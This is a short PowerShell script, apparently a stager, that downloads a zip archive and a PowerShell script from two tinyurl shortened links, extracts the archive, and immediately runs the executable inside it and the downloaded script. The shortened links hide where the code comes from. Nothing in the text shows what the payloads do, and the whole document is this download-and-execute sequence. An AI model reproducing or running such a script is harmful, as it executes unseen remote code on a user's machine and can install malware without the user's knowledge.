Invoke-WebRequest https://tinyurl.com/ynhxn8jw -Outfile test.zip
Invoke-WebRequest https://tinyurl.com/4ffk7zz4 -Outfile startup.ps1
Expand-Archive -LiteralPath ‘test.zip‘ -DestinationPath ‘test‘
./test/test.exe
./startup.ps1
